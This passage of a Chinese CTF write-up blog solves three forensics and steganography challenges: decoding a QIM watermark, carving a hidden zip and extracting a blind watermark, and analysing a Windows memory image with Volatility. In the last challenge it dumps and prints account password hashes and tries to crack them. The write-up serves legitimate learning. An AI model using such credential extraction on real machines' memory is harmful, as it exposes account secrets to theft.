class="built_in">reshape</span>(Embed(<span class="built_in">reshape</span>(lena,<span class="number">1</span>,[]),<span class="built_in">reshape</span>(flag,<span class="number">1</span>,[])),<span class="number">512</span>,<span class="number">512</span>);</span><br><span class="line">imwrite(watermarked_lena,<span class="string">&quot;watermarked_lena.jpg&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">m</span>=<span class="title">Embed</span><span class="params">(p,s)</span></span></span><br><span class="line">    <span class="keyword">global</span> delta;</span><br><span class="line">    <span class="keyword">global</span> b;</span><br><span class="line">    m=p;</span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">i</span>=<span class="number">1</span>:<span class="built_in">length</span>(s)</span><br><span class="line">        m(<span class="built_in">i</span>)=uint8((p(<span class="built_in">i</span>)+delta*s(<span class="built_in">i</span>))/(b*delta))*b*delta+s(<span class="built_in">i</span>)*delta;</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
<p>matlab没环境也看不懂，，，好在代码不多，找找资料还是能看出在写什么的，用python重写了一遍（应该没错吧）</p>
<p>matlab和python还是有点区别的，比如数组下标、cv2读取的通道顺序、numpy reshape的存取顺序都有差，这点费了我好大劲（挺离谱的，学计算机这么久没用过matlab….）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> numpy <span class="keyword">import</span> uint8</span><br><span class="line"><span class="keyword">from</span> cv2 <span class="keyword">import</span> imread,imwrite</span><br><span class="line"><span class="keyword">from</span> copy <span class="keyword">import</span> deepcopy</span><br><span class="line"><span class="keyword">import</span> matplotlib.image</span><br><span class="line"></span><br><span class="line">delta = uint8(<span class="number">16</span>)</span><br><span class="line">b = uint8(<span class="number">2</span>)</span><br><span class="line">lena=matplotlib.image.imread(<span class="string">&quot;lena.jpg&quot;</span>) <span class="comment"># 512*512</span></span><br><span class="line">flag=matplotlib.image.imread(<span class="string">&quot;flag.jpg&quot;</span>) <span class="comment"># 512*80</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># matlab中下标从1开始，python从0开始</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">80</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">512</span>):</span><br><span class="line">        <span class="keyword">if</span> flag[i][j] &lt; <span class="number">200</span>:</span><br><span class="line">            flag[i][j] = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flag[i][j] = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Embed</span>(<span class="params">p, s</span>):</span></span><br><span class="line">    m = deepcopy(p)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">        m[i] = uint8((p[i] + delta * s[i]) / (b * delta)) * b * delta + s[i] * delta</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"><span class="comment"># matlab的reshape按列存新数据，python按行存，所以python中要设置读取顺序和matlab一样</span></span><br><span class="line">p = np.array(lena).reshape(-<span class="number">1</span>,order=<span class="string">&quot;F&quot;</span>)</span><br><span class="line">s = np.array(flag).reshape(-<span class="number">1</span>,order=<span class="string">&quot;F&quot;</span>)</span><br><span class="line">watermarked_lena = np.array(Embed(p, s)).reshape((<span class="number">512</span>, <span class="number">512</span>),order=<span class="string">&quot;F&quot;</span>)</span><br><span class="line">imwrite(<span class="string">&quot;watermarked_lena.jpg&quot;</span>, watermarked_lena)</span><br></pre></td></tr></table></figure>
<p>核心代码很简单，读取flag和lena两张图（不是rgb，均为8位灰度值），flag每个像素点的灰度值&gt;=200则置1，小于200置0，用<code>m[i] = uint8((p[i] + delta * s[i]) / (b * delta)) * b * delta + s[i] * delta</code> 改变lena的部分像素点（就是嵌入水印信息的意思），其中p为lena，s为flag根据灰度值映射后的结果，得到最终的水印图</p>
<p>介绍下<strong>QIM</strong>（Quantization Index Modulation，量化索引调制）</p>
<blockquote>
<p>QIM算法的主要思想是:根据水印信息, 把原始载体数据用量化器量化到不同的索引区间, 水印检测时则根据调制后的数据所属的量化索引区间来识别水印信息。</p>
</blockquote>
<p>太过学术的文章我觉得反而比较难懂…我找了两个博客感觉勉强容易理解一些（<a target="_blank" rel="noopener" href="https://hejueyun.github.io/posts/f9b0a435/">博客1</a>、<a target="_blank" rel="noopener" href="https://www.shuzhiduo.com/A/gAJGwNBbJZ/">博客2</a>）</p>
<p>用本题的例子来理解就是（做出来后和出题人聊了下，好像我的理解好像还是有偏差？<del>算了反正整出来了</del>）：</p>
<ol>
<li>每个像素点的灰度值范围是0~255（uint8），其中区间长度（步长）为delta=16，假设0~15为A区间，那么16~31为B区间，32~47为A区间，48~63为B区间….以此类推，将0~255分为A、B交错的两个区间</li>
<li>flag的像素点灰度值大于200置为1，小于200置为0，得到数组s[512][80]，当然后面会reshape为一维的s[512*80]</li>
<li>将lena进行量化：lena[512][512]reshape为一维的p[512*512]；在s的长度（512<em>80）内，若s[i]为1，则p[i]的像素值修改为$\lfloor(p[i]+16)/32\rfloor </em> 32 + 16$ ，也即落在A区间（假设），若s[i]为0，则p[i]的像素值修改为$\lfloor(p[i])/32\rfloor * 32$，也即落在B区间（与A对应）</li>
<li>因此在我们得到一副水印图时，首先提取出嵌入水印的部分（reshape为一维数组后的前512*80个值），然后根据像素点的灰度值，若灰度值落在A区间（灰度值地板除16模2余1），则s[i]=1，若灰度值落在B区间，则s[i]=0，以此推出水印的信息，最后再给s的0和1赋上足够对比度的值（我用1=&gt;200，0=&gt;50），reshape一下就可以得到水印信息</li>
</ol>
<p>matlab脚本：</p>
<figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">clear</span><br><span class="line"><span class="keyword">global</span> delta</span><br><span class="line"><span class="keyword">global</span> b</span><br><span class="line">delta=uint8(<span class="number">16</span>);</span><br><span class="line">b=uint8(<span class="number">2</span>);</span><br><span class="line">wmlena=imread(<span class="string">&quot;watermarked_lena.jpg&quot;</span>);</span><br><span class="line">flag=<span class="built_in">reshape</span>(<span class="built_in">zeros</span>(<span class="number">80</span>,<span class="number">512</span>),<span class="number">1</span>,[]);</span><br><span class="line">wm=<span class="built_in">reshape</span>(wmlena,<span class="number">1</span>,[]);</span><br><span class="line">tmp=wm;</span><br><span class="line"><span class="keyword">for</span> <span class="built_in">i</span>=<span class="number">1</span>:<span class="built_in">length</span>(flag)</span><br><span class="line">    y=uint8(wm(<span class="built_in">i</span>)/delta);</span><br><span class="line">    z=<span class="built_in">mod</span>(uint8(wm(<span class="built_in">i</span>)/delta),<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">mod</span>(uint8(wm(<span class="built_in">i</span>)/delta),<span class="number">2</span>)==<span class="number">1</span>)</span><br><span class="line">        flag(<span class="built_in">i</span>)=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        flag(<span class="built_in">i</span>)=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line">img=<span class="built_in">reshape</span>(flag,<span class="number">80</span>,<span class="number">512</span>);</span><br><span class="line"><span class="keyword">for</span> <span class="built_in">i</span>=<span class="number">1</span>:<span class="number">80</span></span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">j</span>=<span class="number">1</span>:<span class="number">512</span></span><br><span class="line">        <span class="keyword">if</span>(img(<span class="built_in">i</span>,<span class="built_in">j</span>)==<span class="number">0</span>)</span><br><span class="line">            img(<span class="built_in">i</span>,<span class="built_in">j</span>)=<span class="number">50</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            img(<span class="built_in">i</span>,<span class="built_in">j</span>)=<span class="number">200</span>;</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">img=uint8(img);</span><br><span class="line">imwrite(img,<span class="string">&quot;img.jpg&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>python脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*-coding:utf-8-*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">by vvmdx</span></span><br><span class="line"><span class="string">2021/11/27 12:52</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> numpy <span class="keyword">import</span> uint8</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> matplotlib.image</span><br><span class="line"></span><br><span class="line">delta = uint8(<span class="number">16</span>)</span><br><span class="line">b = uint8(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">wm_lena = matplotlib.image.imread(<span class="string">&quot;watermarked_lena.jpg&quot;</span>)</span><br><span class="line">wm = np.array(wm_lena).reshape(-<span class="number">1</span>,order=<span class="string">&quot;F&quot;</span>)</span><br><span class="line"></span><br><span class="line">flag = np.zeros((<span class="number">80</span>,<span class="number">512</span>))</span><br><span class="line">flag = np.array(flag).reshape(-<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    <span class="keyword">if</span> (wm[i]//<span class="number">16</span>)%<span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">        flag[i] = <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag[i] = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">flag = np.array(flag).reshape((<span class="number">80</span>,<span class="number">512</span>),order=<span class="string">&quot;F&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">80</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">512</span>):</span><br><span class="line">        <span class="keyword">if</span> flag[i][j] == <span class="number">1</span>:</span><br><span class="line">            flag[i][j] = <span class="number">200</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flag[i][j] = <span class="number">50</span></span><br><span class="line"></span><br><span class="line">flag = np.array(flag, dtype=np.uint8)</span><br><span class="line">cv2.imwrite(<span class="string">&quot;flag.jpg&quot;</span>,flag)</span><br><span class="line">cv2.imshow(<span class="string">&quot;flag&quot;</span>,flag)</span><br><span class="line">cv2.waitKey()</span><br></pre></td></tr></table></figure>
<p>效果：</p>
<p>matlab：</p>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211128105614730.png" alt="image-20211128105614730"></p>
<p>python：</p>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211128110248622.png" alt="image-20211128110248622"></p>
<p>u1s1python跑不出这个效果（我甚至把区间调的很大才有上图这个效果，如果是16完全看不出来），不知道为什么，懒得找原因了，我电脑没matlab，找了个<a target="_blank" rel="noopener" href="https://www.tutorialspoint.com/execute_matlab_online.php">在线的</a>盲写了一天代码（还是现学的…）一天都在思考怎么用python表达出来，虽然有个smop（<a target="_blank" rel="noopener" href="https://github.com/victorlei/smop">github</a>）可以将matlab转python，但是转的很离谱….还不如自己改，结果晚上回宿舍用舍友电脑matlab一下子就跑出来了，麻了（另外吐槽下出题人在flag后面注释了512*80，结果我一直用512行80列的矩阵去读，死活读不出来，最好随便改了下参数变成80*512居然就成了）</p>
<p>flag：<code>flag&#123;2a3b-89e-f594&#125;</code></p>
<h3 id="blind"><a href="#blind" class="headerlink" title="blind"></a>blind</h3><ul>
<li>文件反转、图片分离、盲水印</li>
</ul>
<p>给了一张图和一个压缩包，压缩包打不开，丢winhex里发现文件头和文件尾好像反了</p>
<p>504b0304是zip的文件头</p>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211128192707135.png" alt="image-20211128192707135"></p>
<p>gnp.tuotuo 颠倒一下发现是outout.png</p>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211128192724711.png" alt="image-20211128192724711"></p>
<p>文件反转，脚本直接跑</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;secret.zip&quot;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;target.zip&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> g:</span><br><span class="line">        g.write(f.read()[::-<span class="number">1</span>])</span><br></pre></td></tr></table></figure>
<p>跑出正常的压缩包解压，只有一张outout.png，先放着，看看另一张图secret.png，打开发现有一半是黑的，binwalk看一眼，里面藏了个zip，zip里面还有张1.png</p>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211128194626919.png" alt="image-20211128194626919"></p>
<p>分离，foremost分离后不太对劲，丢到winhex里看，发现他的文件头虽然是对的</p>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211128195216795.png" alt="image-20211128195216795"></p>
<p>但是zip包文件目录区没了，反而是在文件尾发现了文件目录区和正常的文件尾</p>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211128195308952.png" alt="image-20211128195308952"></p>
<p>不太懂什么原因，先mark一下，后期整理整理</p>
<p>分离文件的几个方法试完后</p>
<ul>
<li><code>foremost secret.png</code></li>
<li><code>dd if=secret.png of=1.zip skip=248860 bs=1</code></li>
<li><code>binwalk secret.png -e</code></li>
</ul>
<p>发现只有binwalk可以，而且还直接把1.png分离出来了，甚至跳过了zip伪加密的考点（应该是吧）</p>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211128195534472.png" alt="image-20211128195534472"></p>
<p>我不理解 难道属于非那么预期？</p>
<blockquote>
<p>搞完后发现其实文件目录区可以不用一定在开头…在上面文件尾部的压缩文件目录区找到伪加密的标志位改掉就正常解压了…</p>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211128200030379.png" alt="image-20211128200030379"></p>
<p>麻了 搞我好多时间，我居然还想着把这段东西剪切到前面…</p>
</blockquote>
<p>整完发现1.png和前面的outout.png长得一样，结合题目盲水印没跑了，工具：<a target="_blank" rel="noopener" href="https://github.com/chishaxie/BlindWaterMark">https://github.com/chishaxie/BlindWaterMark</a></p>
<p>一键提取<code>python3 bwmforpy3.py decode 1.png outout.png flag.png --oldseed</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211128200350453.png" alt="image-20211128200350453"></p>
<p>flag：flag{easy_misc}（居然不是ea5y_misc？？？怀疑出题人搞完都忘了自己藏的是什么…）</p>
<h3 id="secret"><a href="#secret" class="headerlink" title="secret"></a>secret</h3><blockquote>
<p> u1s1这道题没做出来，很烦，搞了我大半个晚上，不知道怎么找压缩包密码了，蹲一波wp再更新</p>
</blockquote>
<p>给了个image.raw文件，搜了一下，应该是内存取证的题</p>
<ul>
<li>工具：<a target="_blank" rel="noopener" href="https://www.volatilityfoundation.org/releases">volatility</a>（Kali好想2020开始就不预装这个了）</li>
<li>直接下载linux的可执行文件，然后给文件夹和可执行文件改个名：volatility，增加环境变量<code>export PATH=/mnt/hgfs/Kali_share/misc/volatility:$PATH</code>即可命令行使用</li>
</ul>
<ol>
<li><p>查看系统信息</p>
<p><code>volatility -f image.raw imageinfo</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211127095428434.png" alt="image-20211127095428434"></p>
</li>
<li><p>查看进程列表</p>
<p><code>volatility -f image.raw --profile=WinXPSP2x86 pslist</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211127095912668.png" alt="image-20211127095912668"></p>
<p>关注notepad.exe、7zFM.exe、cmd.exe三个进程</p>
</li>
<li><p>看一下cmd执行过的命令和notepad内容</p>
<p><code>volatility -f image.raw --profile=WinXPSP2x86 cmdscan</code></p>
<p>这个好奇怪，什么都没有</p>
<p><code>volatility -f image.raw --profile=WinXPSP2x86 notepad</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211127102514785.png" alt="image-20211127102514785"></p>
<p><del>找到flag了</del>很可惜，并不是这个</p>
</li>
<li><p>对cmdscan的结果感到不满，发现还有其他找cmd的方法</p>
<ul>
<li><p>dump出cmd的进程内存</p>
<p><code>volatility -f image.raw --profile=WinXPSP2x86 memdump -p 528 -D .</code></p>
</li>
<li><p>cmdline看命令行执行了什么</p>
<p><code>volatility -f image.raw --profile=WinXPSP2x86 cmdline</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211127103538075.png" alt="image-20211127103538075"></p>
<p>找到两个可疑文件</p>
</li>
</ul>
</li>
<li><p>查找一下和flag有关的文件</p>
<p><code>volatility -f image.raw --profile=WinXPSP2x86 filescan|grep flag</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211127100644676.png" alt="image-20211127100644676"></p>
</li>
<li><p>把flag.txt dump出来</p>
<p><code>volatility -f image.raw --profile=WinXPSP2x86 dumpfiles -Q 0x00000000016fd440 -D .</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211127102851574.png" alt="image-20211127102851574"></p>
<p>不知为何dump不出来，可能空文件？没懂</p>
</li>
<li><p>把aha.zipdump出来，并恢复为aha.zip</p>
<ul>
<li><code>volatility -f image.raw --profile=WinXPSP2x86 filescan|grep aha</code></li>
<li><p><code>volatility -f image.raw --profile=WinXPSP2x86 dumpfiles -Q 0x00000000019f5590 -D .</code></p>
</li>
<li><p><code>mv file.None.0x815f57f8.dat aha.zip</code></p>
</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211127104108126.png" alt="image-20211127104108126"></p>
</li>
<li><p>解压，发现要解压密码，继续找密码</p>
<p>把一些可能有hint的地方找了个遍，，没找到有用的</p>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211127105327368.png" alt="image-20211127105327368"></p>
</li>
<li><p>hashdump看用户密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># volatility -f image.raw --profile=WinXPSP2x86 hashdump                                          </span><br><span class="line">Volatility Foundation Volatility Framework 2.6</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">HelpAssistant:1000:172b5f482418a719b80c605b8d236dbf:d1e008771f7630fdd3cb50c879d2de9e:::</span><br><span class="line">SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:8dfedc50699ef5bdda791139eb08901e:::</span><br></pre></td></tr></table></figure>
<p>这几个丢到cmd5里，都不行，一个空密码两个notfound</p>
</li>
<li><p>接着又dump了浏览器进程内存、屏幕截图、ie历史、网络连接历史都没找到有用的….（我不理解</p>
</li>
</ol>
<p>先不搞了，整了大半天…等wp吧</p>
<hr>
<p>更新</p>
<ol>
<li><p>没想到在粘贴板里面….我还真看过，，不过看完以为没用就没想起来….</p>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211202155642233.png" alt="image-20211202155642233"></p>
</li>
</ol>
<ol>
<li>解压后flag.txt里即为flag</li>
</ol>
<p>flag：<code>flag&#123;c779d8c2-2706-464f-b466-5f8ccf3cf9fe&#125;</code></p>
<p>麻了，下次做这种题记得随时整理已收集到的信息，不然很容易错漏一些当前没用，但后面可能有用的关键信息</p>

      
    </div>
    <div class="article-footer">
      <blockquote class="mt-2x">
  <ul class="post-copyright list-unstyled">
    
    <li class="post-copyright-link hidden-xs">
      <strong>本文链接：</strong>
      <a href="https://vvmdx.github.io/2021/12/01/2021-12-01-2021Xp0int%E6%9D%AF%E6%96%B0%E7%94%9F%E8%B5%9Bwp/" title="2021Xp0int杯新生赛wp" target="_blank" rel="external">https://vvmdx.github.io/2021/12/01/2021-12-01-2021Xp0int杯新生赛wp/</a>
    </li>
    
  </ul>
</blockquote>


<div class="panel panel-default panel-badger">
  <div class="panel-body">
    <figure class="media">
      <div class="media-left">
        <a href="https://github.com/vvmdx/vvmdx.github.io" target="_blank" class="img-burn thumb-sm visible-lg">
          <img src="/images/avatar.jpg" class="img-rounded w-full" alt="">
        </a>
      </div>
      <div class="media-body">
        <h3 class="media-heading"><a href="https://github.com/vvmdx/vvmdx.github.io" target="_blank"><span class="text-dark">无名大仙</span><small class="ml-1x">学习记录 &amp; 笔记分享</small></a></h3>
        <div>希望在有限的时间里学有所成！</div>
      </div>
    </figure>
  </div>
</div>


    </div>
  </article>
  
    
  <section id="comments">
  	
      <div id="vcomments"></div>
    
  </section>


  
</div>

  <nav class="bar bar-footer clearfix" data-stick-bottom>
  <div class="bar-inner">
  
  <ul class="pager pull-left">
    
    <li class="prev">
      <a href="/2021/12/02/2021-12-02-CTF%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%8F%8ABypass/" title="CTF中的命令执行及Bypass"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;上一篇</span></a>
    </li>
    
    
    <li class="next">
      <a href="/2021/11/14/2021-11-14-2019%E5%AE%89%E6%B4%B5%E6%9D%AFeasy_serialize_php/" title="2019安洵杯easy_serialize_php"><span>下一篇&nbsp;&nbsp;</span> <i class="icon icon-angle-right" aria-hidden="true"></i></a>
    </li>
    
    
    <li class="toggle-toc">
      <a class="toggle-btn collapsed" data-toggle="collapse" href="#collapseToc" aria-expanded="false" title="文章目录" role="button">
        <span>[&nbsp;</span><span>文章目录</span>
        <i class="text-collapsed icon icon-anchor"></i>
        <i class="text-in icon icon-close"></i>
        <span>]</span>
      </a>
    </li>
    
  </ul>
  
  
  
  <div class="bar-right">
    
    <div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter" data-mobile-sites="weibo,qq,qzone"></div>
    
  </div>
  </div>
</nav>
  


</main>

  <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
	</script>
	
	
    <ul class="social-links">
    	
        <li><a href="https://github.com/vvmdx/vvmdx.github.io" target="_blank" title="Github" ><i class="icon icon-github"></i></a></li>
        
    </ul>

    
		
		<span id="busuanzi_container_site_pv">
			总阅读量：<span id="busuanzi_value_site_pv"></span>次
		</span>
		<br />
		<span id="busuanzi_container_site_uv">
			总访客数：<span id="busuanzi_value_site_uv"></span>位
		</span>
		
	
	
</footer>
  <script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script>
<script>
window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
</script>

<script src="/js/plugin.min.js"></script>


<script src="/js/application.js"></script>


    <script>
(function (window) {
    var INSIGHT_CONFIG = {
        TRANSLATION: {
            POSTS: '文章',
            PAGES: '页面',
            CATEGORIES: '分类',
            TAGS: '标签',
            UNTITLED: '(未命名)',
        },
        ROOT_URL: '/',
        CONTENT_URL: '/content.json',
    };
    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
})(window);
</script>

<script src="/js/insight.js"></script>






   
	





   
    
  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/valine"></script>
  <script type="text/javascript">
  var GUEST = ['nick', 'mail', 'link'];
  var meta = 'nick,mail,link';
  meta = meta.split(',').filter(function(item) {
    return GUEST.indexOf(item) > -1;
  });
  new Valine({
    el: '#vcomments',
    verify: false,
    notify: false,
    appId: 'sxsgeGDaI22uOW483iJnK8ok-gzGzoHsz',
    appKey: 'dj90VMpUaL25ueRxXvaR0phd',
    placeholder: '来说点什么吧~ (填写邮箱以便快速收到回复~)',
    avatar: 'monsterid',
    meta: meta,
    pageSize: '10' || 10,
    visitor: true
  });
  </script>

     



  <script src="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.3.5/dist/jquery.fancybox.min.js"></script>
  <script>
  //利用 FancyBox 实现点击图片放大
  $(document).ready(function() {
    $('article img').not('[hidden]').not('.panel-body img').each(function() {
      var $image = $(this);
      var imageCaption = $image.attr('alt');
      var $imageWrapLink = $image.parent('a');
      if ($imageWrapLink.length < 1) {
        var src = this.getAttribute('src');
        var idx = src.lastIndexOf('?');
        if (idx != -1) {
          src = src.substring(0, idx);
        }
        $imageWrapLink = $image.wrap('<a href="' + src + '"></a>').parent('a');
      }
      $imageWrapLink.attr('data-fancybox', 'images');
      if (imageCaption) {
        $imageWrapLink.attr('data-caption', imageCaption);
      }
    });
    $().fancybox({
      selector: '[data-fancybox="images"]',
      hash: false,
      loop: false,
    });
  });
  </script>





<div id="go-top"></div>
<style type="text/css">
#go-top {
 width:40px;height:36px;
 background-color:#6495ED;
 position:relative;
 border-radius:2px;
 position:fixed;right:10px;bottom:60px;
 cursor:pointer;display:none;
}
#go-top:after {
 content:" ";
 position:absolute;left:14px;top:14px;
 border-top:2px solid #fff;border-right:2px solid #fff;
 width:12px;height:12px;
 transform:rotate(-45deg);
}
#go-top:hover {
 background-color:#000080;
}
</style>
<script>
$(function () {
  var top=$("#go-top");
  $(window).scroll(function () {
    ($(window).scrollTop() > 300) ? top.show(300) : top.hide(200);
    $("#go-top").click(function () {
      $('body,html').animate({scrollTop:0});
      return false();
    })
  });
});
</script>

  
  <style>
    .copy-btn {
      display: inline-block;
      padding: 6px 12px;
      font-size: 13px;
      font-weight: 700;
      line-height: 20px;
      color: #333;
      white-space: nowrap;
      vertical-align: middle;
      cursor: pointer;
      background-color: #eee;
      background-image: linear-gradient(#fcfcfc, #eee);
      border: 1px solid #d5d5d5;
      border-radius: 3px;
      user-select: none;
      outline: 0;
    }

    .highlight-wrap .copy-btn {
      transition: opacity .3s ease-in-out;
      opacity: 0;
      padding: 2px 6px;
      position: absolute;
      right: 4px;
      top: 8px;
      z-index: 2;
    }

    .highlight-wrap:hover .copy-btn,
        .highlight-wrap .copy-btn:focus {
      opacity: 1
    }

    .highlight-wrap {
      position: relative;
    }
  </style>
  
  <script>
    addLoadEvent(()=>{
      $('.highlight').each(function (i, e) {
        var $wrap = $('<div>').addClass('highlight-wrap')
        $(e).after($wrap)
        $wrap.append($('<button>').addClass('copy-btn').append('copy').on('click', function (e) {
          var code = $(this).parent().find(".code")[0].innerText
          
          var ta = document.createElement('textarea')
